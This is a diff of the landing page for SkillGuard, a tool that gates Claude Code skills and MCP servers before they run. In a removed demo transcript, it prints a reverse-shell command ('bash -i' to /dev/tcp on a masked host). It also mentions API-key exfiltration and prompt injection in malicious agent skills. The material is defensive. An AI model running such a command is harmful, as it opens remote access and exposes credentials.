@@ -3,19 +3,19 @@
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<title>SkillGuard - scan skills, block unscanned</title>
-<meta name="description" content="SkillGuard scans Claude Code skills and MCP servers before runtime, then blocks unscanned, changed, or critical/high targets. Local. Redacted.">
+<title>SkillGuard - only trusted tools run</title>
+<meta name="description" content="SkillGuard checks agent tools before runtime, blocks changed or high-risk targets, and keeps secrets redacted.">
 <link rel="canonical" href="https://skillguard.sh/">
 <link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='none' stroke='%23D91F2F' stroke-width='2.2' stroke-linecap='square' stroke-linejoin='miter'%3E%3Cpath d='M4 4h16v16H4z'/%3E%3Cpath d='M12 7v7'/%3E%3Cpath d='M12 17h.01'/%3E%3C/svg%3E">
 
 <meta property="og:type" content="website">
-<meta property="og:title" content="SkillGuard - scan skills, block unscanned">
-<meta property="og:description" content="Scan Claude Code skills and MCP servers, then block unscanned, changed, or critical/high targets before runtime.">
+<meta property="og:title" content="SkillGuard - only trusted tools run">
+<meta property="og:description" content="Check agent tools before runtime, then gate use from local verdicts.">
 <meta property="og:image" content="https://skillguard.sh/og.png">
 <meta property="og:url" content="https://skillguard.sh/">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:title" content="SkillGuard - scan skills, block unscanned">
-<meta name="twitter:description" content="A local-first runtime gate for Claude Code skills and MCP servers.">
+<meta name="twitter:title" content="SkillGuard - only trusted tools run">
+<meta name="twitter:description" content="A local-first runtime gate for agent tools.">
 <meta name="twitter:image" content="https://skillguard.sh/og.png">
 
 <style>
@@ -29,6 +29,7 @@
   --panel-dark: #151515;
   --red: #d91f2f;
   --red-dark: #9f111d;
+  --ok: #147a4c;
   --mono: ui-monospace, "SFMono-Regular", Menlo, Consolas, monospace;
   --sans: ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
   --max: 1120px;
@@ -153,24 +154,6 @@ summary:focus-visible {
 
 .hero-grid > * { min-width: 0; }
 
-.eyebrow {
-  display: inline-flex;
-  align-items: center;
-  gap: 8px;
-  margin: 0 0 20px;
-  font-family: var(--mono);
-  font-size: 12px;
-  font-weight: 800;
-  text-transform: uppercase;
-}
-.eyebrow::before {
-  content: "";
-  display: inline-block;
-  width: 10px;
-  height: 10px;
-  background: var(--red);
-}
-
 h1 {
   max-width: 680px;
   margin: 0 0 22px;
@@ -193,25 +176,6 @@ h1 span {
   font-size: 21px;
   line-height: 1.42;
   overflow-wrap: anywhere;
-}
-
-.meta-row {
-  display: flex;
-  flex-wrap: wrap;
-  gap: 8px;
-  margin: 0 0 24px;
-  padding: 0;
-  list-style: none;
-}
-
-.meta-row li {
-  border: 2px solid var(--ink);
-  background: var(--panel);
-  padding: 6px 10px;
-  font-family: var(--mono);
-  font-size: 12px;
-  font-weight: 800;
-  text-transform: uppercase;
 }
 
 .install-box {
@@ -268,14 +232,6 @@ h1 span {
 
 .prompt { color: #ff7a86; user-select: none; }
 
-.install-note {
-  margin: 15px 0 0;
-  color: var(--muted);
-  font-size: 14px;
-}
-
-.install-note a { font-weight: 800; }
-
 .wall {
   width: 100%;
   min-width: 0;
@@ -308,6 +264,8 @@ h1 span {
   position: relative;
   height: 260px;
   overflow: hidden;
+  --block-stop: clamp(22px, calc(50% - 270px), 172px);
+  --pass-mid: calc(50% + 22px);
   background:
     linear-gradient(90deg, transparent 0 49%, var(--red) 49% 51%, transparent 51% 100%),
     repeating-linear-gradient(0deg, #fff, #fff 19px, #eeeeec 20px);
@@ -333,9 +291,11 @@ h1 span {
   background: #fff;
   box-shadow: 5px 5px 0 rgba(17, 17, 17, 0.22);
   font-family: var(--mono);
-  transform: translateX(calc(50% - 154px));
-  opacity: 1;
+  opacity: 0;
 }
+
+.good-one { top: 60px; }
+.good-two { top: 150px; }
 
 .request-card::before {
   content: "Skill";
@@ -367,6 +327,11 @@ h1 span {
   text-transform: uppercase;
 }
 
+.request-risk.ok {
+  border-color: var(--ok);
+  color: var(--ok);
+}
+
 .stamp {
   position: absolute;
   right: 30px;
@@ -379,17 +344,43 @@ h1 span {
   font-weight: 900;
   text-transform: uppercase;
   transform: rotate(-9deg) scale(1);
-  opacity: 1;
+  opacity: 0;
 }
 
+.stamp-pass {
+  border-color: var(--ok);
+  color: var(--ok);
+  font-size: 24px;
+  transform: rotate(6deg) scale(1);
+}
+
+.stamp-good-one { top: 55px; }
+.stamp-good-two { top: 145px; }
+
 @media (prefers-reduced-motion: no-preference) {
-  .request-card {
-    animation: request-hit 6s cubic-bezier(.5, 0, .1, 1) infinite;
-    animation-delay: -2.9s;
+  .blocked-card {
+    animation: bad-block 4.8s cubic-bezier(.45, 0, .18, 1) infinite;
+    animation-delay: -0.7s;
   }
-  .stamp {
-    animation: stamp-in 6s steps(1, end) infinite;
-    animation-delay: -3.6s;
+  .good-one {
+    animation: good-one-pass 4.8s cubic-bezier(.45, 0, .18, 1) infinite;
+    animation-delay: -0.7s;
+  }
+  .good-two {
+    animation: good-two-pass 4.8s cubic-bezier(.45, 0, .18, 1) infinite;
+    animation-delay: -0.7s;
+  }
+  .stamp-block {
+    animation: block-stamp 4.8s steps(1, end) infinite;
+    animation-delay: -0.7s;
+  }
+  .stamp-good-one {
+    animation: pass-one-stamp 4.8s steps(1, end) infinite;
+    animation-delay: -0.7s;
+  }
+  .stamp-good-two {
+    animation: pass-two-stamp 4.8s steps(1, end) infinite;
+    animation-delay: -0.7s;
   }
 }
 
@@ -411,21 +402,50 @@ h1 span {
 .receipt dt { color: #a6a6a6; }
 .receipt dd { margin: 0; }
 .receipt .red { color: #ff7a86; font-weight: 800; }
+.receipt .ok { color: #83d9a8; font-weight: 800; }
 
-@keyframes request-hit {
-  0% { transform: translateX(-320px); opacity: 0; }
-  9% { transform: translateX(0); opacity: 1; }
-  48% { transform: translateX(calc(50% - 154px)); opacity: 1; }
-  58% { transform: translateX(calc(50% - 164px)); opacity: 1; }
-  68% { transform: translateX(calc(50% - 154px)); opacity: 1; }
-  82% { transform: translateX(calc(50% - 154px)); opacity: 1; }
-  100% { transform: translateX(calc(50% - 154px)); opacity: 0; }
+@keyframes bad-block {
+  0% { left: -300px; opacity: 0; transform: translateY(0); }
+  7% { opacity: 1; }
+  15% { left: 22px; opacity: 1; }
+  27% { left: var(--block-stop); opacity: 1; transform: translateY(0); }
+  34% { left: var(--block-stop); opacity: 1; transform: translateY(0); }
+  40% { left: var(--block-stop); opacity: 0; transform: translateY(14px); }
+  100% { left: var(--block-stop); opacity: 0; transform: translateY(14px); }
 }
 
-@keyframes stamp-in {
-  0%, 54% { opacity: 0; }
-  55%, 86% { opacity: 1; transform: rotate(-9deg) scale(1); }
-  87%, 100% { opacity: 0; }
+@keyframes good-one-pass {
+  0%, 40% { left: -300px; opacity: 0; transform: translateY(0); }
+  46% { left: 22px; opacity: 1; }
+  58% { left: var(--pass-mid); opacity: 1; }
+  68% { left: calc(100% + 32px); opacity: 0; }
+  100% { left: calc(100% + 32px); opacity: 0; }
+}
+
+@keyframes good-two-pass {
+  0%, 64% { left: -300px; opacity: 0; transform: translateY(0); }
+  70% { left: 22px; opacity: 1; }
+  82% { left: var(--pass-mid); opacity: 1; }
+  94% { left: calc(100% + 32px); opacity: 0; }
+  100% { left: calc(100% + 32px); opacity: 0; }
+}
+
+@keyframes block-stamp {
+  0%, 26% { opacity: 0; }
+  27%, 38% { opacity: 1; }
+  39%, 100% { opacity: 0; }
+}
+
+@keyframes pass-one-stamp {
+  0%, 56% { opacity: 0; }
+  57%, 65% { opacity: 1; }
+  66%, 100% { opacity: 0; }
+}
+
+@keyframes pass-two-stamp {
+  0%, 80% { opacity: 0; }
+  81%, 91% { opacity: 1; }
+  92%, 100% { opacity: 0; }
 }
 
 section {
@@ -452,102 +472,6 @@ h2 {
   text-transform: uppercase;
 }
 
-.proof-grid {
-  display: grid;
-  grid-template-columns: repeat(2, 1fr);
-  gap: 0;
-  border: 2px solid var(--ink);
-  background: var(--panel);
-}
-
-.proof-card {
-  min-height: 190px;
-  padding: 22px;
-  border-right: 2px solid var(--ink);
-}
-.proof-card:last-child { border-right: 0; }
-
-.proof-num {
-  display: block;
-  margin-bottom: 15px;
-  font-family: var(--mono);
-  font-size: 54px;
-  line-height: 0.9;
-  font-weight: 900;
-  color: var(--red);
-}
-
-.proof-card h3 {
-  margin: 0 0 10px;
-  font-size: 20px;
-  line-height: 1.15;
-}
-
-.proof-card p {
-  margin: 0;
-  color: var(--muted);
-  font-size: 15px;
-}
-
-.proof-note {
-  margin: 16px 0 0;
-  color: var(--muted);
-  font-size: 14px;
-}
-
-.terminal {
-  border: 2px solid var(--ink);
-  background: var(--panel-dark);
-  color: #f7f7f7;
-}
-
-.terminal-bar {
-  display: flex;
-  align-items: center;
-  gap: 7px;
-  border-bottom: 1px solid #3a3a3a;
-  padding: 11px 13px;
-}
-
-.dot {
-  width: 12px;
-  height: 12px;
-  border: 1px solid #f7f7f7;
-  background: #2f2f2f;
-}
-.dot:first-child { background: var(--red); border-color: var(--red); }
-
-.terminal-title {
-  margin-left: 8px;
-  color: #bfbfbf;
-  font-family: var(--mono);
-  font-size: 12px;
-  text-transform: uppercase;
-}
-
-.terminal video {
-  display: block;
-  width: 100%;
-  height: auto;
-  background: #050505;
-}
-
-.transcript {
-  margin: 0;
-  padding: 22px 18px;
-  overflow-x: auto;
-  background: #050505;
-  color: #f7f7f7;
-  font-family: var(--mono);
-  font-size: 14px;
-  line-height: 1.8;
-}
-
-.transcript .dim { color: #999; }
-.transcript .bad { color: #ff7a86; font-weight: 800; }
-.terminal[data-show-fallback="true"] video { display: none; }
-.terminal:not([data-show-fallback="true"]) .transcript { display: none; }
-
 .steps {
   display: grid;
   grid-template-columns: repeat(3, 1fr);
@@ -557,8 +481,8 @@ h2 {
 .step {
   background: var(--panel);
   border: 2px solid var(--ink);
-  padding: 22px;
-  min-height: 230px;
+  padding: 22px 22px 24px;
+  min-height: 190px;
 }
 
 .step-num {
@@ -566,18 +490,11 @@ h2 {
   place-items: center;
   width: 38px;
   height: 38px;
-  margin-bottom: 20px;
+  margin-bottom: 18px;
   background: var(--ink);
   color: #fff;
   font-family: var(--mono);
   font-weight: 900;
-}
-
-.step h3 {
-  margin: 0 0 10px;
-  font-size: 26px;
-  line-height: 1;
-  text-transform: uppercase;
 }
 
 .step p { margin: 0; color: var(--muted); }
@@ -588,13 +505,23 @@ h2 {
   color: var(--red-dark);
 }
 
+.faq {
+  background: var(--panel-dark);
+  color: #f7f7f7;
+}
+
+.faq h2 { color: #fff; }
+
+.faq code { color: #ff7a86; }
+
 .faq-list {
-  border: 2px solid var(--ink);
-  background: var(--panel);
+  border: 2px solid #f7f7f7;
+  background: #191919;
+  box-shadow: 8px 8px 0 var(--red);
 }
 
 details {
-  border-bottom: 2px solid var(--ink);
+  border-bottom: 2px solid #f7f7f7;
 }
 details:last-child { border-bottom: 0; }
 
@@ -618,31 +545,7 @@ details[open] summary::after { content: "-"; }
 .answer {
   max-width: 870px;
   padding: 0 20px 18px;
-  color: var(--muted);
-}
-
-.cta {
-  background: var(--ink);
-  color: #fff;
-}
-
-.cta h2,
-.cta .section-kicker { color: #fff; }
-
-.cta .section-kicker { color: #ff7a86; }
-
-.cta .install-box {
-  border-color: #fff;
-  box-shadow: 8px 8px 0 var(--red);
-}
-
-.cta a { color: #fff; }
-
-.license-line {
-  max-width: 740px;
-  margin: 20px 0 0;
   color: #c8c8c8;
-  font-size: 14px;
 }
 
 footer {
@@ -674,28 +577,17 @@ footer {
   html { scroll-behavior: auto; }
   .request-card,
   .stamp { animation: none !important; }
-  .request-card {
-    transform: translateX(calc(50% - 154px));
-    opacity: 1;
-  }
-  .stamp {
-    opacity: 1;
-    transform: rotate(-9deg) scale(1);
-  }
-  .terminal video { display: none !important; }
-  .terminal .transcript { display: block !important; }
+  .blocked-card { left: var(--block-stop); top: 84px; opacity: 1; }
+  .good-one { left: var(--pass-mid); top: 42px; opacity: 1; }
+  .good-two { left: var(--pass-mid); top: 150px; opacity: 1; }
+  .stamp-block { opacity: 1; transform: rotate(-9deg) scale(1); }
+  .stamp-pass { opacity: 0; }
 }
 
 @media (max-width: 940px) {
   .hero-grid { grid-template-columns: 1fr; }
   h1 { font-size: 58px; }
-  .proof-grid,
   .steps { grid-template-columns: 1fr; }
-  .proof-card {
-    border-right: 0;
-    border-bottom: 2px solid var(--ink);
-  }
-  .proof-card:last-child { border-bottom: 0; }
 }
 
 @media (max-width: 640px) {
@@ -713,14 +605,12 @@ footer {
   .wall { box-shadow: 6px 6px 0 var(--ink); }
   .wall-stage { height: 230px; }
   .request-card {
-    left: 14px;
-    width: 190px;
-    transform: none;
-    animation: none !important;
+    width: 170px;
   }
   .stamp { right: 16px; top: 112px; font-size: 22px; }
+  .stamp-good-one { top: 55px; }
+  .stamp-good-two { top: 145px; }
   section { padding: 50px 0; }
-  .proof-num { font-size: 44px; }
   summary { font-size: 16px; }
   .footer-inner { align-items: flex-start; }
 }
@@ -748,15 +638,8 @@ footer {
   <section class="hero" aria-labelledby="hero-heading">
     <div class="wrap hero-grid">
       <div>
-        <p class="eyebrow">Runtime gate</p>
-        <h1 id="hero-heading">Scan skills. <span>Block unscanned.</span></h1>
-        <p class="sub">SkillGuard checks Claude Code skills and MCP servers before Claude runs them. Unscanned, changed, and critical/high targets stop there.</p>
-        <ul class="meta-row" aria-label="Supported surfaces and guarantees">
-          <li>Skills</li>
-          <li>MCP</li>
-          <li>Local</li>
-          <li>Secrets redacted</li>
-        </ul>
+        <h1 id="hero-heading">Only trusted tools <span>run.</span></h1>
+        <p class="sub">SkillGuard checks agent tools before runtime. Risky or changed targets stop. Trusted ones pass.</p>
 
         <div class="install-box" id="install">
           <div class="install-head">
@@ -767,95 +650,64 @@ skillguard --target all --engines local" aria-label="Copy install commands">Copy
           <pre><code><span class="prompt">$</span> curl -fsSL https://skillguard.sh/install | sh
 <span class="prompt">$</span> skillguard --target all --engines local</code></pre>
         </div>
-        <p class="install-note">Scans skills and MCP servers. Plugin install is in <a href="#faq">FAQ</a>.</p>
       </div>
 
-      <div class="wall" role="img" aria-label="SkillGuard refusing the pretty-formatter skill before any command runs.">
+      <div class="wall" role="img" aria-label="SkillGuard blocking a reverse shell request and passing clean requests.">
         <div class="wall-top">
-          <span>Skill request</span>
-          <span class="status-red">Blocked</span>
+          <span>Runtime requests</span>
+          <span class="status-red">Gated</span>
         </div>
         <div class="wall-stage" aria-hidden="true">
           <span class="wall-label">Runtime gate</span>
-          <div class="request-card">
+          <div class="request-card blocked-card">
             <div>
               <span class="request-name">pretty-formatter</span>
               <span class="request-risk">reverse shell</span>
             </div>
           </div>
-          <div class="stamp">Refused</div>
+          <div class="request-card good-one">
+            <div>
+              <span class="request-name">docs-helper</span>
+              <span class="request-risk ok">clean</span>
+            </div>
+          </div>
+          <div class="request-card good-two">
+            <div>
+              <span class="request-name">release-notes</span>
+              <span class="request-risk ok">clean</span>
+            </div>
+          </div>
+          <div class="stamp stamp-block">Blocked</div>
+          <div class="stamp stamp-pass stamp-good-one">Passed</div>
+          <div class="stamp stamp-pass stamp-good-two">Passed</div>
         </div>
         <div class="receipt">
           <dl class="receipt-grid">
-            <dt>target</dt><dd>pretty-formatter</dd>
-            <dt>finding</dt><dd class="red">critical / reverse_shell</dd>
-            <dt>action</dt><dd>exit 2</dd>
-            <dt>ran</dt><dd>0 commands</dd>
+            <dt>blocked</dt><dd class="red">pretty-formatter / reverse_shell</dd>
+            <dt>passed</dt><dd class="ok">docs-helper, release-notes</dd>
+            <dt>action</dt><dd>exit 2 on risk</dd>
+            <dt>ran</dt><dd>0 blocked commands</dd>
           </dl>
         </div>
       </div>
     </div>
   </section>
 
-  <section aria-labelledby="proof-heading">
-    <div class="wrap">
-      <p class="section-kicker">Risk</p>
-      <h2 id="proof-heading">Skill supply chains are already hostile.</h2>
-      <div class="proof-grid">
-        <article class="proof-card">
-          <span class="proof-num">341</span>
-          <h3>malicious skills found by Koi</h3>
-          <p>Typosquatted ClawHub skills installed infostealers for wallets, SSH keys, and env files.</p>
-        </article>
-        <article class="proof-card">
-          <span class="proof-num">13.4%</span>
-          <h3>critical issue rate in Snyk's audit</h3>
-          <p>Snyk found 534 critical-risk skills in 3,984 audited.</p>
-        </article>
-      </div>
-      <p class="proof-note">Sources: <a href="https://www.koi.ai/blog/clawhavoc-341-malicious-clawedbot-skills-found-by-the-bot-they-were-targeting" rel="noopener">Koi</a> and <a href="https://snyk.io/blog/toxicskills-malicious-ai-agent-skills-clawhub/" rel="noopener">Snyk</a>. SkillGuard scans for those failure modes before runtime.</p>
-    </div>
-  </section>
-
-  <section aria-labelledby="demo-heading">
-    <div class="wrap">
-      <p class="section-kicker">Actual output</p>
-      <h2 id="demo-heading">Block before execution.</h2>
-      <div class="terminal" id="demo-terminal">
-        <div class="terminal-bar" aria-hidden="true">
-          <span class="dot"></span><span class="dot"></span><span class="dot"></span>
-          <span class="terminal-title">pretty-formatter blocked / 0 commands ran</span>
-        </div>
-        <video id="demo-video" src="demo.mp4" poster="demo-poster.png" muted autoplay loop playsinline preload="metadata" aria-label="Terminal recording of SkillGuard scanning and blocking pretty-formatter."></video>
-        <pre class="transcript" role="img" aria-label="SkillGuard scan output: pretty-formatter blocked for reverse shell, credential exfiltration, and prompt injection."><span class="prompt">$</span> skillguard --skill pretty-formatter
-<span class="dim">SkillGuard scanning pretty-formatter ...</span>
-<span class="bad">BLOCKED reverse shell: bash -i &gt;&amp; /dev/tcp/45.x.x.x/4444</span>
-<span class="bad">BLOCKED credential exfil: reads ANTHROPIC_API_KEY</span>
-<span class="bad">BLOCKED prompt injection in SKILL.md</span>
-<span class="dim">PreToolUse hook refused execution. 0 commands ran.</span></pre>
-      </div>
-    </div>
-  </section>
-
   <section aria-labelledby="how-heading">
     <div class="wrap">
-      <p class="section-kicker">Mechanism</p>
-      <h2 id="how-heading">Read. Gate. Log.</h2>
+      <h2 id="how-heading">How it works.</h2>
       <div class="steps">
         <article class="step">
           <span class="step-num">1</span>
-          <h3>Read</h3>
-          <p>Scan <code>SKILL.md</code>, scripts, MCP configs, launch commands, endpoints, and env/header names.</p>
+          <p>Check skills, bundled files, and MCP server config with local or optional engines.</p>
         </article>
         <article class="step">
           <span class="step-num">2</span>
-          <h3>Gate</h3>
-          <p>Block unscanned, changed, critical, and high-risk targets unless you bypass explicitly.</p>
+          <p>At runtime, use cached verdicts. Block unknown, changed, critical, and high-risk targets unless allowed.</p>
         </article>
         <article class="step">
           <span class="step-num">3</span>
-          <h3>Log</h3>
-          <p>Keep local history. Inspect secrets in memory, then redact before persistence.</p>
+          <p>Keep history and hook decisions local. Inspect secrets in memory; persist only redacted records.</p>
         </article>
       </div>
     </div>
@@ -863,16 +715,15 @@ skillguard --target all --engines local" aria-label="Copy install commands">Copy
 
   <section class="faq" id="faq" aria-labelledby="faq-heading">
     <div class="wrap">
-      <p class="section-kicker">Details</p>
-      <h2 id="faq-heading">Short answers.</h2>
+      <h2 id="faq-heading">FAQ.</h2>
       <div class="faq-list">
         <details>
-          <summary>What gets scanned?</summary>
-          <div class="answer">Claude Code skills, bundled scripts, and MCP server surfaces from global, project, and plugin config.</div>
+          <summary>What does it check?</summary>
+          <div class="answer">Agent skills, bundled files, and MCP server surfaces from global, project, and plugin config.</div>
         </details>
         <details>
           <summary>Does it block MCP calls?</summary>
-          <div class="answer">Yes. <code>mcp_policy</code> defaults to <code>enforce</code>, so unscanned or critical/high MCP servers are refused.</div>
+          <div class="answer">Yes. <code>mcp_policy</code> defaults to <code>enforce</code>, so unknown or critical/high MCP servers are refused.</div>
         </details>
         <details>
           <summary>Do API keys touch disk?</summary>
@@ -887,23 +738,6 @@ skillguard --target all --engines local" aria-label="Copy install commands">Copy
           <div class="answer">Inside Claude Code, run <code>/plugin marketplace add mannanj/skillguard</code> and then <code>/plugin install skillguard@skillguard</code>.</div>
         </details>
       </div>
-    </div>
-  </section>
-
-  <section class="cta" aria-labelledby="cta-heading">
-    <div class="wrap">
-      <p class="section-kicker">Install</p>
-      <h2 id="cta-heading">Block unscanned before Claude runs it.</h2>
-      <div class="install-box">
-        <div class="install-head">
-          <span>Install</span>
-          <button class="copy-btn" type="button" data-copy="curl -fsSL https://skillguard.sh/install | sh
-skillguard --target all --engines local" aria-label="Copy install commands">Copy</button>
-        </div>
-        <pre><code><span class="prompt">$</span> curl -fsSL https://skillguard.sh/install | sh
-<span class="prompt">$</span> skillguard --target all --engines local</code></pre>
-      </div>
-      <p class="license-line"><a href="https://github.com/mannanj/skillguard/blob/main/LICENSE" rel="noopener">AGPL-3.0</a>. Commercial licenses available.</p>
     </div>
   </section>
 </main>
@@ -961,18 +795,6 @@ skillguard --target all --engines local" aria-label="Copy install commands">Copy
         legacyCopy(text);
         flash(btn);
       }
-    });
-  }
-
-  var term = document.getElementById("demo-terminal");
-  var vid = document.getElementById("demo-video");
-  var reduce = window.matchMedia && window.matchMedia("(prefers-reduced-motion: reduce)").matches;
-  if (term && (reduce || !vid)) {
-    term.setAttribute("data-show-fallback", "true");
-  }
-  if (term && vid) {
-    vid.addEventListener("error", function () {
-      term.setAttribute("data-show-fallback", "true");
     });
   }
 })();
